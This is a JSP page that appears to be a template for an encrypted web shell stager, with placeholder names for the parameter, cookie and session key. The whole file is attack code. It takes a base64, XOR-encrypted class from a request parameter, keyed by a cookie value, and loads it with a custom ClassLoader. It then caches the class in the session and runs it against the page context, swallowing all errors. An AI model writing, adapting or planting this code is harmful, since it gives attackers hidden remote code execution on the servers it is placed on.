
<%@ page contentType="text/html;charset=UTF-8" language="java" pageEncoding="UTF-8" %>
<%!

    String pm = "$param$"; 
    
    class $_classloader extends ClassLoader {
        public $_classloader(ClassLoader $_z) {
            super($_z);
        }
        
        public Class $_defineclass(byte[] $_cb) {
            return super.defineClass($_cb, 0, $_cb.length);
        }
    }
    
    public byte[] $_x(byte[] $_s, String $_key) {
        try {
            byte[] $_keyBytes = $_key.getBytes("UTF-8");
            byte[] $_result = new byte[$_s.length];
            for (int $_i = 0; $_i < $_s.length; $_i++) {
                $_result[$_i] = (byte) ($_s[$_i] ^ $_keyBytes[$_i % $_keyBytes.length]);
            }
            return $_result;
        } catch (Exception $_e) {
            return null;
        }
    }
    
    
    public static byte[] $_base64Decode(String $_bs) throws Exception {
        Class $_base64;
        byte[] $_value = null;
        try {
            $_base64 = Class.forName("java.util.Base64");
            Object $_decoder = $_base64.getMethod("getDecoder", null).invoke($_base64, null);
            $_value = (byte[])$_decoder.getClass().getMethod("decode", new Class[] { String.class })
                   .invoke($_decoder, new Object[] { $_bs });
        } catch (Exception $_e) {
            try {
                $_base64 = Class.forName("sun.misc.BASE64Decoder"); 
                Object $_decoder = $_base64.newInstance(); 
                $_value = (byte[])$_decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class })
                       .invoke($_decoder, new Object[] { $_bs });
            } catch (Exception $_e2) {}
        }
        return $_value;
    }
%>

<%
    try {
        final String YOUR_COOKIE = "$cookie_name$";
        String $_stagerKey = null;
        javax.servlet.http.Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (javax.servlet.http.Cookie cookie : cookies) {
                if (YOUR_COOKIE.equals(cookie.getName())) {
                    $_stagerKey = cookie.getValue();
                    break;
                }
            }   
        }

        if (session.getAttribute("$payload$") == null) {
            byte[] $_data = $_base64Decode(request.getParameter(pm));

            $_data = $_x($_data, $_stagerKey);
            try {
                Class $_loadedClass = new $_classloader(this.getClass().getClassLoader()).$_defineclass($_data);
                session.setAttribute("$payload$", $_loadedClass);
            } catch (Exception classLoadException) {
                return;
            }
            
        } else {
            java.io.ByteArrayOutputStream $_arrOut = new java.io.ByteArrayOutputStream();
            Object $_f = ((Class)session.getAttribute("$payload$")).newInstance();
            $_f.equals($_arrOut);
            $_f.equals(pageContext);
            $_f.toString();
        }
    } catch (Exception e) {
    }
%>